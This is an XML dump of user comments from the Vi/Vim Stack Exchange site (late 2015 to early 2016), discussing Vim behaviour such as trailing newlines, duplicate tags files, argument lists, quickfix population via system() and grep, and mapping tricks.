  <row Id="9157" PostId="5947" Score="0" Text="I didn't know what it was called, the tag seemed to refer to it though? Shame about the answer, but thanks nonetheless." CreationDate="2015-12-24T12:42:48.127" UserId="5778" />
  <row Id="9158" PostId="5947" Score="2" Text="No &quot;modeline&quot; is something else entirely. See `:help modeline`." CreationDate="2015-12-24T12:57:32.137" UserId="54" />
  <row Id="9159" PostId="5947" Score="0" Text="Fixed now, thanks." CreationDate="2015-12-24T13:37:13.583" UserId="5778" />
  <row Id="9160" PostId="5948" Score="0" Text="Yes, I know it's there. As I stated I want to _see_ it there. I have other editors configured to display a blank line at the end of a file, I want vim to too. It allows easy appending - `Go` will start me writing on a new line with a blank between it and the last thing; on save I'll get that blank back. Without a blank line displayed, that's `Go&lt;kbd&gt;return&lt;/kbd&gt;` to achieve the same. Not a massive deal, but it's how I like it even if you disapprove :)" CreationDate="2015-12-24T13:44:32.980" UserId="5778" />
  <row Id="9161" PostId="5950" Score="3" Text="You probably have something in your vimrc (which you didn't post...). Probably something in a `InsertLeave` autocmd, or a `t_*` setting. Also see: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)." CreationDate="2015-12-24T14:10:27.070" UserId="51" />
  <row Id="9162" PostId="5950" Score="1" Text="Thank you, I'll try to comment those things out and see what's the change." CreationDate="2015-12-24T14:33:39.967" UserId="902" />
  <row Id="9163" PostId="5952" Score="4" Text="The last-used search term is automatically restored after leaving a function, so saving &amp; restoring that shouldn't be required when using it inside a function. See [`:help function-search-undo`](http://vimhelp.appspot.com/eval.txt.html#function%2dsearch%2dundo)" CreationDate="2015-12-24T17:30:50.303" UserId="51" />
  <row Id="9164" PostId="5952" Score="1" Text="Ah, I didn't realize that.  Thanks!" CreationDate="2015-12-24T17:39:49.547" UserId="865" />
  <row Id="9165" PostId="89" Score="0" Text="Thanks this was very helpful." CreationDate="2015-12-24T20:04:13.047" UserId="4536" />
  <row Id="9166" PostId="5916" Score="0" Text="@VladGURDIGA I've just tried and they all work as expected from the shell: `vim $(find . -name ver\*.c -print)`, `vim $(ls -t *.patch  | head -n1)`, `vim $(find /etc -name '*.conf' | grep input)`, `vim $(find /etc -name '*.conf')`, `vim $(find . -name '*.conf')`" CreationDate="2015-12-24T21:04:58.910" UserId="4939" />
  <row Id="9167" PostId="5948" Score="0" Text="Well no, you can't convince Vim to display a non-existing line. Thankfully." CreationDate="2015-12-24T21:19:30.427" UserId="54" />
  <row Id="9168" PostId="5948" Score="0" Text="Well, you say nonexisting line, I say existing newline character `\n` that every other editor I have installed will recognise." CreationDate="2015-12-24T21:23:56.273" UserId="5778" />
  <row Id="9169" PostId="5948" Score="0" Text="Ending your file with a &quot;newline&quot; character and ending the file with an empty line are two different things. The former is generally considered a good thing that Vim does automatically (unless you tell it otherwise) but there's no built-in way to force it to do the latter without some kind of scripting. Something like an autocommand with the `BufWritePre` event…" CreationDate="2015-12-24T21:52:25.803" UserId="54" />
  <row Id="9170" PostId="5955" Score="4" Text="To move all the lines, from the current one down to the last one, one line upward, you could also use a range: `:.,$m-2`" CreationDate="2015-12-24T22:50:59.787" UserId="4939" />
  <row Id="9171" PostId="5919" Score="0" Text="awesome function, althought I don't know all the vim scripts, but thanks, it work perfectly!! btw, I add just one additional check for it only works when there're just two windows." CreationDate="2015-12-24T23:24:35.620" UserId="1276" />
  <row Id="9173" PostId="5948" Score="0" Text="But it comes back to what you said about interpretation. The same file opened in e.g. Notepad, Atom, TextEdit, Sublime has an empty line displayed at the end." CreationDate="2015-12-25T00:01:21.067" UserId="5778" />
  <row Id="9174" PostId="5932" Score="1" Text="@romainl It seems that you mistyped `5@q` for `5aq`. Could you explain `cgn'&lt;Esc&gt;`? I cannot figure out what it means." CreationDate="2015-12-25T01:01:41.173" UserId="5510" />
  <row Id="9175" PostId="5955" Score="3" Text="also, `kddGp` should do the same thing as `:.,$m-2`..." CreationDate="2015-12-25T01:15:06.680" UserId="4729" />
  <row Id="9176" PostId="5948" Score="0" Text="@OllieFord: This is because of different philosophies of the editors. Notepad et al. interpret NL as &quot;go to another line&quot;. Vim, having descended from a line editor, defines a line in the UNIX way: &quot;a line is a string of characters ending with NL&quot;. In Vim, there is no line after the last NL. If you want to see the NL itself, `:set list`. It's like learning to use a fork after years of using a spoon, and complaining that it's not round. Wishing Vim was Notepad is not a productive use of your time." CreationDate="2015-12-25T01:21:37.640" UserId="4729" />
  <row Id="9177" PostId="5948" Score="0" Text="@Amadan I absolutely don't wish vim was notepad, just hoped for the option like exists in Atom and Sublime - but your explanation makes sense, I understand now. Thanks." CreationDate="2015-12-25T01:33:03.493" UserId="5778" />
  <row Id="9178" PostId="5916" Score="0" Text="@VladGURDIGA But I would like to know how to populate the arglist without quitting the current session as I have usually only one. I could also move around in the shell, search for a group of files and send them to a Vim server (with the argument `--remote`, see: http://vi.stackexchange.com/a/5618/4939) but I'm curious to know how to do it directly from the current session. If it's not possible that's fine, but after reading the help it seems it can be done. If it is, I would like to understand why vim reacts so differently to similar commands." CreationDate="2015-12-25T02:43:34.207" UserId="4939" />
  <row Id="9179" PostId="5932" Score="2" Text="@FengYu, I fixed my answer, thanks. `cgn` means &quot;change the next/current match of the last search&quot;, here the last search is `&quot;` so the cursor is moved to the next `&quot;` which is changed into a `'`. Since `c` puts us into insert mode we need to leave it with `&lt;Esc&gt;`. So that's `cgn` in normal mode, then `'&lt;Esc&gt;` in normal mode." CreationDate="2015-12-25T10:59:18.307" UserId="54" />
  <row Id="9180" PostId="5961" Score="0" Text="Also note that you can also use `m'` and `''` instead of `m\`` and `\`\``" CreationDate="2015-12-25T11:20:26.743" UserId="865" />
  <row Id="9181" PostId="5961" Score="2" Text="@EvergreenTree, `''` won't jump to the right column, only to the right line." CreationDate="2015-12-25T11:26:34.787" UserId="54" />
  <row Id="9182" PostId="5953" Score="2" Text="What a weird Idea." CreationDate="2015-12-25T11:30:02.657" UserId="54" />
  <row Id="9183" PostId="5961" Score="0" Text="Ah, I didn't realize that." CreationDate="2015-12-25T11:42:08.323" UserId="865" />
  <row Id="9184" PostId="5916" Score="0" Text="Hey, it seems like in the first sample command you’re missing the closing backtick. ;) Aside from that though, I guess the example from the help use two backslashes instead of one to prevent shell expansion, as explained here: http://unix.stackexchange.com/q/104260/23669." CreationDate="2015-12-25T12:19:51.957" UserId="4922" />
  <row Id="9185" PostId="5916" Score="0" Text="In the case of `find /etc -name '*.conf'` not working, I’d think some funny names come out of that command, and, this may be the reason why it worked when piped through `grep`." CreationDate="2015-12-25T12:26:10.097" UserId="4922" />
  <row Id="9186" PostId="5952" Score="1" Text="rather use winsaveview()/winrestview() instead of cursor()" CreationDate="2015-12-25T15:16:13.020" UserId="71" />
  <row Id="9187" PostId="5963" Score="1" Text="What is the output of `:echo tagfiles()`?" CreationDate="2015-12-25T16:27:47.707" UserId="54" />
  <row Id="9188" PostId="5965" Score="1" Text="The first result when googling &quot;offlineimaprc vim&quot; is a [github project](https://github.com/hrother/offlineimaprc.vim) that provides &quot;Syntax highlighting offlineimap configuration file&quot;. I haven't tried it, but it seems worth looking at." CreationDate="2015-12-25T18:22:45.860" UserId="4620" />
  <row Id="9189" PostId="5965" Score="0" Text="lol, duckduckgo.com didn't show me that result in the first 4 pages. Thanks anyways, it works. Would you consider to write your comment again as answer? Then i can mark it as solved." CreationDate="2015-12-25T18:46:24.830" UserId="2354" />
  <row Id="9190" PostId="5954" Score="0" Text="https://github.com/powerline/fonts" CreationDate="2015-12-25T20:04:23.747" UserId="5789" />
  <row Id="9191" PostId="5965" Score="0" Text="Cool, glad it works. I added an answer." CreationDate="2015-12-25T21:04:01.130" UserId="4620" />
  <row Id="9192" PostId="5954" Score="0" Text="Thank you very much for that link maximus, I forgot to mention it in my post. I did indeed use the fonts from there. Anyways my problem seems to be fixed, except for the missing cursor." CreationDate="2015-12-26T00:40:52.407" UserId="5780" />
  <row Id="9193" PostId="5916" Score="0" Text="@VladGURDIGA Thank you for your answers ! You're probably right, the output could contain some special names or symbols that would explain those strange behaviors. Thanks for the link I'm going to read it!" CreationDate="2015-12-26T03:41:23.040" UserId="4939" />
  <row Id="9195" PostId="5967" Score="0" Text="And this is a very interesting answer, which made me learn something does solve the problem. Cheers :)" CreationDate="2015-12-26T09:58:55.223" UserId="2978" />
  <row Id="9196" PostId="5963" Score="1" Text="Vim seems to be using two tags files, `tags` and `TAGS`. Do you have a `TAGS` file in `/home/yufeng/mount/svncode/omu/zycp/Source/`? Could it be a case-sensitivity issue?" CreationDate="2015-12-26T10:08:26.507" UserId="54" />
  <row Id="9199" PostId="5936" Score="1" Text="Why is that question still open?" CreationDate="2015-12-26T10:20:26.600" UserId="54" />
  <row Id="9218" PostId="5974" Score="4" Text="Related (though not an exact duplicate, as this is about vi, not Vim): [Fix arrow keys displaying A, B, C, D in vi (not in vim)](http://vi.stackexchange.com/q/5123/51)." CreationDate="2015-12-26T16:45:05.220" UserId="51" />
  <row Id="9219" PostId="5974" Score="1" Text="In the shell, what is the output of `echo $TERM`? What is the output of `set term` in Vim?" CreationDate="2015-12-26T17:09:09.493" UserId="205" />
  <row Id="9221" PostId="5974" Score="0" Text="@muru $TERM is `xterm`, set term is `term=xterm`" CreationDate="2015-12-27T02:13:05.967" UserId="5795" />
  <row Id="9222" PostId="5974" Score="0" Text="If you don't have `set nocompatible` (i.e. no vimrc) you should have one." CreationDate="2015-12-27T05:13:43.267" UserId="46" />
  <row Id="9223" PostId="5975" Score="0" Text="Personally I don't recommend using python for doing settings. I would probably rewrite it in vimscript." CreationDate="2015-12-27T05:15:33.237" UserId="46" />
  <row Id="9225" PostId="5975" Score="0" Text="Thank you very much! And yes, the old Python interface works, I just thought that using neovim is more preferrable.&#xA;Could you please give me some directions on how to construct such a string in Vimscript? Thank you very much." CreationDate="2015-12-27T10:39:41.140" UserId="5753" />
  <row Id="9226" PostId="5977" Score="2" Text="You should probably store the old height and restore it, rather than hard offing the &quot;old&quot; value." CreationDate="2015-12-28T17:43:18.750" UserId="5342" />
  <row Id="9227" PostId="3047" Score="0" Text="I think that use 3 is better, because sometimes more than 2 lines are shown. For me many times xD" CreationDate="2015-12-28T18:21:04.720" UserId="177" />
  <row Id="9228" PostId="5957" Score="0" Text="Is it possible to save with this name just using :w?" CreationDate="2015-12-28T19:44:34.027" UserId="177" />
  <row Id="9229" PostId="4866" Score="0" Text="You could remap `n` with `:nnoremap n n:nohl&lt;CR&gt;`" CreationDate="2015-12-29T01:05:24.053" UserId="51" />
  <row Id="9230" PostId="5963" Score="1" Text="@romainl I think you're on to something. Given that every vim newcomer nowadays is working on Mac OS X, this might help the OP: http://apple.stackexchange.com/questions/71357/how-to-check-if-my-hd-is-case-sensitive-or-not  I would guess that Vim is assuming that in Unix all filesystems are case sensitive." CreationDate="2015-12-29T14:01:29.947" UserId="599" />
  <row Id="9231" PostId="5963" Score="0" Text="@Vitor, I don't know much about Vim's guts but I can imagine it asking the file system for a `tags` file and then asking for a `TAGS` file. A case-sensitive FS would answer yes to both question, forcing Vim to search two times in the same file thinking there are two, while a case-insensitive FS would answer yes only to the first question." CreationDate="2015-12-29T14:41:49.140" UserId="54" />
  <row Id="9233" PostId="5963" Score="0" Text="Vitor's link tells you how for Mac OS X. Google will tell you for other OSes." CreationDate="2015-12-29T14:47:42.220" UserId="54" />
  <row Id="9234" PostId="5963" Score="0" Text="@romainl I mounted my project file in Windows to Fedora. But Mount is case-insensitive though Fedora is case-sensitive. It seems that it is the *mount* that led this problem. see: http://superuser.com/questions/680492/mounts-arent-case-sensitive" CreationDate="2015-12-29T14:51:57.830" UserId="5510" />
  <row Id="9235" PostId="5963" Score="0" Text="BTW, I mixed up case-sensitive and case-insensitive in my previous comment. Sorry." CreationDate="2015-12-29T14:59:08.577" UserId="54" />
  <row Id="9239" PostId="5987" Score="0" Text="ya this is what I wanted! It works in vim but I happen to use an emulation of vim that doesn't support vimscript functions (i just realized this) do happen to know any other way to do this? Thanks in any case." CreationDate="2015-12-29T16:57:27.360" UserId="1305" />
  <row Id="9240" PostId="5983" Score="0" Text="Fabulous, thanks very much @saginaw.     I actually have a few different spacing commands I use, like \pad, \ppad, in addition to Pad.    Obviously I could duplicate the macro for each of these, but for instructional purposes,  I presume there's a way to pass an argument to the macro,  modify the &quot;let string&quot; line to insert the argument instead of Pad, and then    define a different noremap for each option, e.g., ;p would insert \pad, ;pp would insert \ppad?       Thanks again!" CreationDate="2015-12-29T17:04:58.397" UserId="4667" />
  <row Id="9241" PostId="5987" Score="0" Text="@fYre I don't know if it will work with your vim version, but I've edited my answer to propose an alternative. I hope it will work." CreationDate="2015-12-29T17:07:14.950" UserId="4939" />
  <row Id="9243" PostId="5987" Score="0" Text="@fYre If it doesn't produce what you want, you should probably update your question, add a little more information (your vim version and which features it was compiled with) and refuse my answer as being a solution to your problem. Someone else will probably have another working solution for your vim version." CreationDate="2015-12-29T17:28:04.413" UserId="4939" />
  <row Id="9244" PostId="5983" Score="0" Text="@LeoSimon You can define a whole group of mappings with a single `for` loop and the `:execute` command. See here for an example: https://github.com/romainl/dotvim/blob/master/vimrc#L307-L312 It should not be difficult to do the same thing for your mappings. However, I don't know how to pass &quot;pad&quot;, &quot;ppad&quot;, ... as an argument to the function. I have an idea (after reading `:h g@`, it seems you could add an optional group of arguments with `...` and access the first argument of this group with `a:1`), but I haven't succeeded in writing a working function. If I can, I'll let you know." CreationDate="2015-12-29T18:00:32.280" UserId="4939" />
  <row Id="9245" PostId="3823" Score="0" Text="// , Does this actually _append_ though?" CreationDate="2015-12-29T18:19:14.923" UserId="2394" />
  <row Id="9247" PostId="3823" Score="0" Text="// , Why do you list three `&quot;Ay` commands?" CreationDate="2015-12-29T18:20:37.797" UserId="2394" />
  <row Id="9248" PostId="3825" Score="0" Text="// , `vim directory/another_directory/yet_another_directory/file_name` In the case of using the `Documents` folder, you could use the following: `vim Documents/file_name`.  I like your alias idea, though. For someone new to Linux and the idea of file paths in general, this is a good question." CreationDate="2015-12-29T18:25:40.657" UserId="2394" />
  <row Id="9249" PostId="3824" Score="1" Text="// , This is a case of someone not knowing the proper &quot;question surface&quot; in which it is appropriate to ask questions about. Imagine an alien, new to cars, after learning how to make it go forward and backward, how to make it go up." CreationDate="2015-12-29T18:27:47.020" UserId="2394" />
  <row Id="9250" PostId="5990" Score="0" Text="I failed to fully clarify my goal. I want to be able to use vims commands, such as w to move forward a word and such. I will edit my question to correct." CreationDate="2015-12-29T18:33:51.380" UserId="2695" />
  <row Id="9251" PostId="5988" Score="0" Text="Not a bad start! But it would be much more useable as a plugin. Do you mind if I create one? (Or you could make one yourself.)" CreationDate="2015-12-29T18:38:51.547" UserId="1060" />
  <row Id="9252" PostId="5990" Score="0" Text="@JasonBasanese I've edited my answer, do the Ex commands `:normal` and `:execute` do what you want?" CreationDate="2015-12-29T19:00:53.663" UserId="4939" />
  <row Id="9253" PostId="3823" Score="0" Text="It could have been four or twelve. Just an example." CreationDate="2015-12-29T19:35:55.933" UserId="54" />
  <row Id="9254" PostId="5983" Score="0" Text="Thanks @saginaw,  I started on the for loop, but sadly, couldn't get past first base.    I tried the following as a beginning step:  within your macro," CreationDate="2015-12-29T20:40:55.343" UserId="4667" />
  <row Id="9255" PostId="5983" Score="0" Text="@LeoSimon I hope the name `PadMacro` is not too misleading, because it's just a vimscript function. I called it like that because you said `\Pad{}` was interpreted as a latex macro. But if you prefer, you can call it anything else (`PadEnclosure` for example). For the mappings, let's say you have 3 functions `MyFunctionA`, `MyFunctionB` and `MyFunctionC`, each one applying a certain transformation on your text. And you want to map them to `;Pa`, `;Pb` and `;Pc`. Then the following code should be able to do it for you: https://paste.debian.net/plain/356949 Not tested, so I'm not sure it works." CreationDate="2015-12-29T21:19:07.833" UserId="4939" />
  <row Id="9256" PostId="5983" Score="0" Text="Thanks! @saginaw . PadMacro is perfectly fine.     Your loop worked beautifully.   Everything would be a bit more elegant if I could include the actual script function in the loop.     It's easy to modify the line  `\let string =`  so that it accepts a list item instead of a Pad; the problem part is to define the macro name as a list item instead of a literal string, i.e., the following doesn't work (not surprisingly)  `function! s: . func_name .  (type) abort`.  Maybe there's some way of creating the function with a generic name, then within the loop copying the generic function to func_name?" CreationDate="2015-12-29T22:45:02.087" UserId="4667" />
  <row Id="9257" PostId="5992" Score="2" Text="Here is a vimcast on the topic: http://vimcasts.org/episodes/tabs-and-spaces/   I think it clarifies what all of the indentation options do." CreationDate="2015-12-30T00:11:14.317" UserId="865" />
  <row Id="9258" PostId="5983" Score="0" Text="@LeoSimon I'm not sure this is what you want, but you could try this: https://gist.github.com/chenoweth/3ff00e4530a9abed86f4 It's just a template, so if it's what you want, you would still have to replace `MyFunction` with the function name you want, `foo`, `bar` and `baz` with the macro names you want, and `a`, `b`, `c` with the mappings you want. Without any modification, `;Pa{motion}` should enclose text with `\{foo}`, `;Pb{motion}` with `\{bar}` and `;Pc{motion}` with `\{baz}`. Of course, you could add other macro names and mappings to the `macros` and `mappings` lists." CreationDate="2015-12-30T00:16:37.813" UserId="4939" />
  <row Id="9259" PostId="5992" Score="0" Text="It's indeed very comprehensive and clear. Thank you very much!" CreationDate="2015-12-30T01:04:36.730" UserId="5833" />
  <row Id="9260" PostId="5992" Score="4" Text="@wlnirvana if you have understood what's going on, would you care to write an answer explaining things? Might be useful for future visitors." CreationDate="2015-12-30T01:48:06.057" UserId="205" />
  <row Id="9261" PostId="5978" Score="0" Text="&quot;d&quot; is delete, &quot;p&quot; is print or put." CreationDate="2015-12-30T01:52:22.640" UserId="5835" />
  <row Id="9262" PostId="5992" Score="0" Text="I was trying to but I suddenly found that my problem is not solved thoroughly... See update above." CreationDate="2015-12-30T09:20:56.797" UserId="5833" />
  <row Id="9265" PostId="6001" Score="0" Text="BTW, why wouldn't Vim stop searching tags file when it has already found one? Thus, duplicate problem will not exist." CreationDate="2015-12-30T13:56:10.990" UserId="5510" />
  <row Id="9266" PostId="6002" Score="2" Text="report as issue to either syntastic or YCM/jedi-vim?" CreationDate="2015-12-30T15:57:18.660" UserId="71" />
  <row Id="9267" PostId="6002" Score="0" Text="I don't think it's a plugin-specific issue, but i will do. Thanks." CreationDate="2015-12-30T16:20:04.480" UserId="5842" />
  <row Id="9268" PostId="5992" Score="0" Text="You can post that as an answer, instead of putting it in the question." CreationDate="2015-12-30T17:15:44.333" UserId="205" />
  <row Id="9269" PostId="6002" Score="2" Text="The only way to rule them out is to try the same scenario without those plugins." CreationDate="2015-12-30T18:06:47.640" UserId="54" />
  <row Id="9272" PostId="6006" Score="0" Text="Gee, sorry about that, I spent a few minutes trying out different searches and couldn't find it. Hopefully this adds a few more keywords. Thanks!" CreationDate="2015-12-30T19:47:14.623" UserId="5849" />
  <row Id="9273" PostId="5992" Score="0" Text="But I think Chirst's answer should be chosen. Maybe I should have edited his answer instead of putting it in my question?" CreationDate="2015-12-31T00:12:38.563" UserId="5833" />
  <row Id="9276" PostId="6008" Score="3" Text="FWIW, `:g/;/j` doesn't work because it is done in two passes: first the buffer is scanned, then the command is applied to the matching lines." CreationDate="2015-12-31T06:59:49.510" UserId="54" />
  <row Id="9278" PostId="6009" Score="0" Text="+1 for mentioning and explaining excellently solution 2" CreationDate="2015-12-31T08:23:05.957" UserId="71" />
  <row Id="9279" PostId="6014" Score="0" Text="I am aware of `:b 5` to switch to buffer number 5 but `5 CTRL-E` would be significantly faster! If EasyMotion had a buffer selector, that could be a good alternative, in order to minimize keystrokes. Sorry for the X and Y question. :-P" CreationDate="2015-12-31T11:29:55.320" UserId="630" />
  <row Id="9280" PostId="6004" Score="0" Text="Hmm... http://vi.stackexchange.com/questions/2846/how-to-set-up-vim-to-work-with-one-sentence-per-line?rq=1 is very similar..." CreationDate="2015-12-31T11:36:23.163" UserId="854" />
  <row Id="9281" PostId="6014" Score="1" Text="http://stackoverflow.com/q/18897364/789222" CreationDate="2015-12-31T11:55:15.027" UserId="71" />
  <row Id="9282" PostId="6012" Score="2" Text="Thank you , @Christian Brabandt" CreationDate="2015-12-31T12:25:38.543" UserId="5841" />
  <row Id="9283" PostId="6011" Score="2" Text="Thank you , @akshay" CreationDate="2015-12-31T12:26:11.000" UserId="5841" />
  <row Id="9284" PostId="6014" Score="0" Text="I meant `:5b&lt;CR&gt;` ealier, that's the short one. `:b 5&lt;CR&gt;` is one character longer, and `5:b&lt;CR&gt;` is just a mess! Thanks Christian, I should have checked on that old website too! ;-)" CreationDate="2015-12-31T12:37:21.800" UserId="630" />
  <row Id="9285" PostId="6016" Score="4" Text="`incsearch` is either on or off." CreationDate="2015-12-31T19:24:28.270" UserId="54" />
  <row Id="9286" PostId="6016" Score="3" Text="You could also try `g/`." CreationDate="2015-12-31T19:50:19.380" UserId="21" />
  <row Id="9287" PostId="6016" Score="0" Text="Then i guess I could write a map to turn incsearch on and off would what work for me." CreationDate="2015-12-31T20:07:08.510" UserId="5601" />
  <row Id="9288" PostId="6001" Score="0" Text="In terms of files, some people break their projects into multiple parts. For example, my main source might be tagged in one file and a shared library tagged in another, but I'd want to be able to find a definition either way. In terms of continuing once a symbol is found in the tags files, sometimes a project might have variants, where there are two functions of the same name but only one or the other gets built/linked for a given variant. When jumping to a definition like that, you'd want to be able to pick which variant you care about right now from the list, rather than only the first one v" CreationDate="2016-01-01T15:11:30.153" UserId="227" />
  <row Id="9289" PostId="6001" Score="0" Text="(Continued) Vim finds." CreationDate="2016-01-01T15:13:13.360" UserId="227" />
  <row Id="9290" PostId="6019" Score="1" Text="it should be possible to set the 'errorformat' to the required formatstring, redir the messages command to a temporary file and use :cfile to read and parse the file into a quickfix list. I have never done that however" CreationDate="2016-01-01T16:30:13.983" UserId="71" />
  <row Id="9291" PostId="6023" Score="0" Text="`s` alone will work only for one line, to make it global, you need to use `%s`, but then it'll join almost all the lines, including non `;` lines" CreationDate="2016-01-01T20:39:35.053" UserId="467" />
  <row Id="9292" PostId="6023" Score="2" Text="@kenorb Ehm no, I think you can use the `:s` command exactly for what you want. I think this `%s/;\n\(.*;\)\@=/;/` does what you need." CreationDate="2016-01-01T21:01:58.213" UserId="71" />
  <row Id="9293" PostId="6027" Score="2" Text="thanks, I wish you were right, but grep's `--exclude` is for excluding files, not patterns. e.g. from man grep *--exclude=GLOB  Skip  files whose base name matches GLOB (using wildcard matching).*" CreationDate="2016-01-02T06:41:27.547" UserId="4603" />
  <row Id="9294" PostId="6025" Score="1" Text="Does the following work? : `:cexpr system(&quot;grep -Rn 'color:' . \| grep -v '@'&quot;)` If it does, to save some keystrokes you could define the command `:CS` like this: `command! -nargs=1 CS :cexpr system(&lt;q-args&gt;)`, and then use it like this: `:CS grep -Rn 'color:' \| grep -v '@'`" CreationDate="2016-01-02T08:27:46.737" UserId="4939" />
  <row Id="9295" PostId="6025" Score="0" Text="yep, it sure does! I wondered if system would work, but Im not familiar enough with vimscript to use it, also even if it did work, I wouldn't have thought the quicklist would work. thats sweet." CreationDate="2016-01-02T08:34:24.483" UserId="4603" />
  <row Id="9296" PostId="6025" Score="1" Text="ah, you need to use the `-n` switch to grep and then vim can parse it into its quicklist" CreationDate="2016-01-02T08:35:37.533" UserId="4603" />
  <row Id="9297" PostId="6025" Score="0" Text="`system()` is just a function to which you can give any shell command as an argument. It sends it to the shell which executes it and then gives you its output. `:cexpr` is an Ex command which takes a string or a list as an argument, and parses it to populate the quickfix list. So basically, you're sending your shell command from vim to the shell through `system()` and then parse its output through `:cexpr`. And yes, you're right, using the `-n` switch with `grep` seems necessary for vim to correctly parse the output. In `:help cexpr`, they use it in one of their example." CreationDate="2016-01-02T10:25:04.600" UserId="4939" />
  <row Id="9298" PostId="6025" Score="0" Text="I think the answer of @trailing-slash is correct because it explains well why your command didn't work, you weren't using the `grep` from the shell but from vim, so you probably can't use the same syntax. If you want more info, see `:help system()` and `:help :cexpr`." CreationDate="2016-01-02T10:27:35.647" UserId="4939" />
  <row Id="9299" PostId="6025" Score="0" Text="@saginaw thanks for explanation. Part of why I couldnt figure it out how to use `system()` was that I wasnt sure how you could run the vimscript command `system()` from `:ex` mode (because ex mode doesnt evaluate vimscript). but Im guessing `:cexpr` is special that way." CreationDate="2016-01-02T10:37:40.270" UserId="4603" />
  <row Id="9300" PostId="6025" Score="0" Text="I may be wrong, but whether you're on the command line or writing a script, afaik it doesn't make any difference, same instructions, same syntax. However, all Ex commands don't behave in the same way, because they don't necessarily accept the same kind of argument. Here `:cexpr` accept an expression as an argument. And since `system()` is an expression (which can be evaluated as a string), everything is good. However, take this other example: `:edit tempname()`. `tempname()` generates a random file name, so this command should edit a temp file. And yet it doesn't work. Why?" CreationDate="2016-01-02T11:07:36.493" UserId="4939" />
  <row Id="9301" PostId="6025" Score="0" Text="Because `:edit` doesn't accept an expression as an argument but a filename.  How do you know whether an Ex command accept an expression as an argument or not? Afaik, there's no general rule, but each time you want to pass an expression as an argument to an Ex command, you can check in the help. In `:h :cexpr` they mention `{expr}` on the first line.  In `:h :edit`, they don't. They only mention `{file}`." CreationDate="2016-01-02T11:07:41.867" UserId="4939" />
  <row Id="9302" PostId="6025" Score="0" Text="cool, yes I thought system was being evaluated and its result passed into cexpr, but you cant run system in ex mode. so im guessing its evaluated inside cexpr, like a callback, and thats why it can be used in ex mode" CreationDate="2016-01-02T11:21:57.233" UserId="4603" />
  <row Id="9303" PostId="5910" Score="0" Text="I had similar problem. On cygwin mailing list I've found [a thread](https://cygwin.com/ml/cygwin/2015-04/msg00623.html) that made me look for another build of gvim. Since my migration (to this [version](https://bintray.com/veegee/generic/vim_x64)), I'm now able to run `system(&quot;ls&quot;)` again." CreationDate="2016-01-02T11:43:27.547" UserId="626" />
  <row Id="9304" PostId="6019" Score="0" Text="@ChristianBrabandt I thought about doing something like this but I don't know all the details of `:help error-file-format`. That's the solution that I would like the most. If one day I know how to do it, I'll post it here. Thank you for pointing me on the right direction (`'errorformat'`) and confirming it's possible." CreationDate="2016-01-02T12:02:45.237" UserId="4939" />
  <row Id="9305" PostId="6019" Score="2" Text="Yeah, errorformat is a little bit like black vodoo ;)" CreationDate="2016-01-02T12:55:25.757" UserId="71" />
  <row Id="9306" PostId="6030" Score="0" Text="Is there a way I could make it type out the &quot;Hello, &quot; before I have answered the input prompt?" CreationDate="2016-01-02T18:45:13.490" UserId="2695" />
  <row Id="9307" PostId="6030" Score="0" Text="@JasonBasanese As far as I know, no.  _(at least using this method)_" CreationDate="2016-01-02T19:04:24.997" UserId="865" />
  <row Id="9308" PostId="6030" Score="0" Text="@JasonBasanese I don't know if there's another way of doing it, but you could try this: https://paste.debian.net/plain/359252" CreationDate="2016-01-02T19:34:08.420" UserId="4939" />
  <row Id="9309" PostId="6030" Score="0" Text="@saginaw I figured it would be possible, but not the way I was doing it.  Also, you can use http://vpaste.net/ for vimscript syntax highlighting." CreationDate="2016-01-02T19:50:47.757" UserId="865" />
  <row Id="9310" PostId="6030" Score="0" Text="@EvergreenTree Thank you, I didn't know this service, I will use it for the syntax highlighting. Yes, the problem seems to come from the `input()` function because when you call it from a mapping it consumes the remaining characters from it. At the very end of `:help input()`, they give an example of how to solve the issue, but it involves defining a function and calling `inputsave()` and `inputrestore()` which makes the code much longer. I prefer your code as it takes only one line and is simpler to maintain." CreationDate="2016-01-02T20:06:18.340" UserId="4939" />
  <row Id="9311" PostId="5812" Score="0" Text="should be fixed with [7.4.1035](https://github.com/vim/vim/releases/tag/v7.4.1035)" CreationDate="2016-01-02T21:11:12.230" UserId="71" />
  <row Id="9312" PostId="6032" Score="0" Text="what is your formatoptions setting?" CreationDate="2016-01-02T21:31:34.420" UserId="71" />
  <row Id="9313" PostId="6032" Score="0" Text="@ChristianBrabandt `formatoptions=t,a`" CreationDate="2016-01-02T21:33:11.623" UserId="2354" />
  <row Id="9314" PostId="4866" Score="0" Text="Thanks, I updated the answer with some more info." CreationDate="2016-01-02T22:35:22.483" UserId="21" />
  <row Id="9315" PostId="4844" Score="0" Text="I'm curious: did my solution not work for you? I think it should work (I've tested it), and it seems to me that it should be marked the correct answer. If not, could you explain what is wrong?" CreationDate="2016-01-02T22:36:00.490" UserId="21" />
  <row Id="9316" PostId="5879" Score="0" Text="there's a problem, when I have multiple noname buffer, I can't figure out which noname buffer it's asking me to confirm, it always prompt the same message: `save changes to &quot;untitled&quot;? [Y]es, [N]o ...`" CreationDate="2016-01-03T04:00:03.120" UserId="1276" />
  <row Id="9317" PostId="5879" Score="0" Text="So you would like a preview of the file you are being asked about? I don't know how to do that." CreationDate="2016-01-03T11:06:11.857" UserId="4655" />
  <row Id="9318" PostId="5879" Score="0" Text="As an idea, you could write a script to give the behaviour you're after. Maybe something that starts off by closing all non-modified buffers, perhaps something with `if (&amp;modified == 0)`..." CreationDate="2016-01-03T11:29:24.087" UserId="4655" />
  <row Id="9319" PostId="6035" Score="3" Text="If your definition of an invalid string is any string containing a non-digit character, you could use the atom `\D` like this: `let debug = value =~ '\D' ? &quot;NO&quot; : &quot;YES&quot;` (Also `:help /character-classes` might help you)" CreationDate="2016-01-03T18:11:53.950" UserId="4939" />
  <row Id="9320" PostId="6035" Score="2" Text="Thank you, I think this works as well: `let l:debug = empty(a:value =~ '[^0-9]') ? &quot;YES&quot; : &quot;NO&quot;`" CreationDate="2016-01-03T18:47:01.037" UserId="5328" />
  <row Id="9321" PostId="6035" Score="0" Text="I'm not sure but if you made some tests and it works, then it's all good. If you want more help, maybe add some context from your script, aside from just the 3 lines. If you're interested in writing a regex in general, here are 2 useful links: http://vimregex.com/ and http://regex.learncodethehardway.org/book/" CreationDate="2016-01-03T19:03:30.687" UserId="4939" />
